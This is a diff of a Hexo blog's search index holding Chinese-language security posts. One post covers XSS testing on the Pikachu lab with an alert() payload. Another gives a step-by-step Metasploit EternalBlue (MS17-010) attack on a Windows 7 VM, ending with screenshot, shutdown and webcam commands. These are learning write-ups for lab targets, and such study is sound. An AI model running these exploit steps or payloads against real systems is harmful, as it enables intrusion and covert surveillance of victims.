@@ -1,6 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Hello World</title>
+    <url>/2020/04/02/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre>
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre>
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+  </entry>
+  <entry>
     <title>note_2</title>
     <url>/2020/05/11/note-2/</url>
     <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><ul>
@@ -9,15 +41,14 @@
 <li>反射型: 又被称为非持久性、参数型XSS。常见的XSS攻击，恶意代码通常在URL地址的请求参数中，且交互的数据一般不会被存在数据库里面，一次性。</li>
 <li>存储型: 又被称为持久型XSS，相比于反射型XSS，其危害性更大大大大大大，甚至可能危害Web服务器本身的安全。常见于评论区、留言，即交互的数据会被存在数据库里面，永久性存储（我慌了，你呢？）</li>
 <li>DOM型: 基于文档对象模型的一种漏洞，是一种通过DOM操作前端代码输出的时候产生的问题，不与后台服务器产生数据交互，一次性，也属于反射型</li>
-<li>危害: 存储型 &gt;&gt; 反射型 &gt; DOM型（等等，为啥有个远大于号？）<h4 id="一丢丢测试流程"><a href="#一丢丢测试流程" class="headerlink" title="一丢丢测试流程"></a>一丢丢测试流程</h4>（1）目标上找输入点，“见框就插”，比如查询接口、留言板啥的<br>（2）输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理<br>（3）构造闭合 -&gt; 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件<br>（4）提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行则说明存在XSS漏洞</li>
+<li>危害: 存储型 &gt;&gt; 反射型 &gt; DOM型（等等，为啥有个远大于号？）<h4 id="一丢丢测试流程"><a href="#一丢丢测试流程" class="headerlink" title="一丢丢测试流程"></a>一丢丢测试流程</h4>（1）目标上找输入点，“见框就插”，比如查询接口、留言板啥的<br>（2）输入一组 “特殊字符（&gt;，’，”等）+唯一识别字符” ，点击提交后，查看返回源码，看后端返回的数据是否有处理<br>（3）构造闭合 -&gt; 通过搜索定位到唯一字符，结合唯一字符前后语法确定是否可以构造执行js的条件<br>（4）提交构造的脚本代码（以及各种绕过姿势），看是否可以成功执行，成功执行则说明存在XSS漏洞<br>以下是在pikachu（皮卡丘）漏洞平台瞎捣鼓的小实验，一起来搞啊</li>
 </ul>
-<p>以下是在pikachu（皮卡丘）漏洞平台瞎捣鼓的小实验，一起来搞啊</p>
+<hr>
 <h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><h3 id="Cross-Site-Scripting"><a href="#Cross-Site-Scripting" class="headerlink" title="Cross-Site Scripting"></a>Cross-Site Scripting</h3><h4 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h4><p>“上去就是见框就插”，先输入特殊字符看看会不会被过滤掉,试试输入&lt;&gt;’’””123啥的<br><img src="https://s1.ax1x.com/2020/05/11/YJKGkR.png" alt=""><br>看来是被过滤掉了，那通过查看页面源码可以发现，我们输入的内容到了p标签里面，接着试试用JS代码，看是否还是被过滤，payload可如下</p>
+<pre><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code></pre><p>但发现前端对输入做了长度限制，则需要在页面源码处找到maxlength修改一下了，再次插入提交发现<br><img src="https://s1.ax1x.com/2020/05/11/YJQbOU.png" alt=""><br>成功弹窗了，在页面源码也可发现输入的payload嵌入了p标签且被正确执行</p>
 <ul>
-<li><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code><br>但发现前端对输入做了长度限制，则需要在页面源码处找到maxlength修改一下了，再次插入提交发现<br><img src="https://s1.ax1x.com/2020/05/11/YJQbOU.png" alt=""><br>成功弹窗了，在页面源码也可发现输入的payload嵌入了p标签且被正确执行</li>
 <li><strong>这是个GET型XSS漏洞，将带有XSS的URL伪装后发送给目标，从前端输入，由后端接受再输出</strong><h4 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h4>（后期补充）<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4></li>
-<li><strong>存储型XSS和反射型XSS形成原因是一样的，不同的则是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害（这就有点难顶了）</strong><br>我们先试试在平台给出的实验留言框中输入一下特殊字符，看看是否存在过滤，尝试后发现输入内容当作留言且直接输出了<br><img src="https://s1.ax1x.com/2020/05/11/YJjTdH.png" alt=""><br>接下来查看页面源码，发现输入的东西被直接放在p标签了，没有经过任何转义处理，输入payload测试</li>
-<li><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code><br><img src="https://s1.ax1x.com/2020/05/11/YJvx91.png" alt=""><br>成功弹窗了，原理也是和反射型的差不多，只是这种XSS的持久危害性较大</li>
+<li><strong>存储型XSS和反射型XSS形成原因是一样的，不同的则是存储型XSS下攻击者可以将脚本注入到后台存储起来，构成更加持久的危害（这就有点难顶了）</strong><br>我们先试试在平台给出的实验留言框中输入一下特殊字符，看看是否存在过滤，尝试后发现输入内容当作留言且直接输出了<br><img src="https://s1.ax1x.com/2020/05/11/YJjTdH.png" alt=""><br>接下来查看页面源码，发现输入的东西被直接放在p标签了，没有经过任何转义处理，输入payload测试<pre><code>&lt;script&gt;alert("Hello?")&lt;/script&gt;</code></pre><img src="https://s1.ax1x.com/2020/05/11/YJvx91.png" alt=""><br>成功弹窗了，原理也是和反射型的差不多，只是这种XSS的持久危害性较大<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4></li>
 </ul>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -40,6 +71,47 @@
       </script>]]></content>
       <tags>
         <tag>XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>第一次攻击实验</title>
+    <url>/2020/04/15/ok/</url>
+    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
+<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
+<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
+<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
+<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
+<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
+<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
+<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
+<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
+<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
+<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
+<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
+<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
+<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
+<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>]]></content>
+      <tags>
+        <tag>experiment</tag>
       </tags>
   </entry>
   <entry>
@@ -108,79 +180,6 @@
       </script>]]></content>
       <tags>
         <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2020/04/02/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class=" language-bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span></code></pre>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class=" language-bash"><code class="language-bash">$ hexo server</code></pre>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class=" language-bash"><code class="language-bash">$ hexo generate</code></pre>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class=" language-bash"><code class="language-bash">$ hexo deploy</code></pre>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-  </entry>
-  <entry>
-    <title>第一次攻击实验</title>
-    <url>/2020/04/15/ok/</url>
-    <content><![CDATA[<p>实验:metasploit下利用”永恒之蓝”攻击win7<br>(准备阶段，win7虚拟机，kali linux系统)<br>实验声明:网络不是法外之地~~</p>
-<h3 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h3><p>初次使用 –&gt; msfdb init/reinit<br>开启数据库 –&gt; sudo service postgresql start</p>
-<h5 id="msfconsole进入hexo"><a href="#msfconsole进入hexo" class="headerlink" title="msfconsole进入hexo"></a>msfconsole进入hexo</h5><p><img src="https://wx2.sbimg.cn/2020/04/15/p0.jpg" alt=""></p>
-<h5 id="搜索cve17-010相关的exp"><a href="#搜索cve17-010相关的exp" class="headerlink" title="搜索cve17-010相关的exp"></a>搜索cve17-010相关的exp</h5><p>输入 –&gt; search ms17-010<br><img src="https://wx1.sbimg.cn/2020/04/15/p1.png" alt=""></p>
-<h5 id="扫描漏洞"><a href="#扫描漏洞" class="headerlink" title="扫描漏洞"></a>扫描漏洞</h5><p>输入 –&gt; use auxiliary/scanner/smb/smb_ms17_010<br>使用options查看参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p2.png" alt=""></p>
-<h5 id="关键来了，找了win7的IP，"><a href="#关键来了，找了win7的IP，" class="headerlink" title="关键来了，找了win7的IP，"></a>关键来了，找了win7的IP，</h5><p>输入 –&gt; set RHOSTS 192.168.XXX.XXX<br>接着 –&gt; run<br><img src="https://wx2.sbimg.cn/2020/04/15/p3.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p4.png" alt=""></p>
-<p>接着 –&gt; use exploit/windows/smb/ms17_010_eternalblue<br>使用options查看相关参数<br><img src="https://wx1.sbimg.cn/2020/04/15/p5.png" alt=""></p>
-<p>然后 –&gt; set RHOSTS 192.168.XXX.XXX (靶机的IP)</p>
-<h5 id="查看payload"><a href="#查看payload" class="headerlink" title="查看payload"></a>查看payload</h5><p>show payloads<br><img src="https://wx1.sbimg.cn/2020/04/15/p6.png" alt=""></p>
-<h5 id="使用payload"><a href="#使用payload" class="headerlink" title="使用payload"></a>使用payload</h5><p>set payload (号数)<br>使用options查看payload要的参数<br><img src="https://wx2.sbimg.cn/2020/04/15/p7.png" alt=""></p>
-<p>*设置本机IP –&gt; set LHOST 192.168.XXX.XXX</p>
-<h5 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h5><p>exploit<br><img src="https://wx2.sbimg.cn/2020/04/15/p8.png" alt=""><br><img src="https://wx1.sbimg.cn/2020/04/15/p9.png" alt=""></p>
-<p>然后就可以进行截屏、关机、开摄像头等操作了,嘿嘿<br>截屏 –&gt; screenshot<br>关机 –&gt; shutdown<br>开摄像头 –&gt; webcam_scream<br><img src="https://wx2.sbimg.cn/2020/04/15/p10.png" alt=""></p>
-<p>以下则是小实验的“偷窥”成果<br><img src="https://wx1.sbimg.cn/2020/04/15/p11.png" alt=""><br><img src="https://wx2.sbimg.cn/2020/04/15/p12.png" alt=""></p>
-<p>老板觉得博文勉强过得去记得三连嘿，爱宁哟</p>
-<script>
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (!el.dataset.src) { return; }
-            const img = document.createElement('img');
-            img.style = 'display:none !important;';
-            img.src = el.dataset.src;
-            img.addEventListener('error', () => {
-              img.remove();
-              el.style.color = 'inherit';
-              el.style.backgroundImage = 'none';
-              el.style.background = 'none';
-            });
-            img.addEventListener('load', () => {
-              img.remove();
-            });
-            document.body.appendChild(img);
-          });
-      </script>]]></content>
-      <tags>
-        <tag>experiment</tag>
       </tags>
   </entry>
 </search>
